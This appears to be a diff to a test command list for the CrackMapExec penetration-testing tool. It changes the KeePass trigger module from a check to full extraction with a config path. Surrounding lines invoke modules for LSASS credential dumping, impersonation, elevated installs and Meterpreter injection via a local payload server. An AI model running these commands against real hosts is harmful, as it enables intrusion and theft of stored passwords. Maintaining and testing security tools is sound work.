@@ -45,7 +45,7 @@ crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M impersonate
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M install_elevated
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M ioxidresolver
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M keepass_discover
-crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M keepass_trigger -o ACTION=CHECK USER=USERNAME
+crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M keepass_trigger -o ACTION=ALL USER=USERNAME KEEPASS_CONFIG_PATH="C:\\Users\\USERNAME\\AppData\\Roaming\\KeePass\\KeePass.config.xml"
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M lsassy
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M masky
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M met_inject -o SRVHOST=127.0.0.1 SRVPORT=4444 RAND=12345
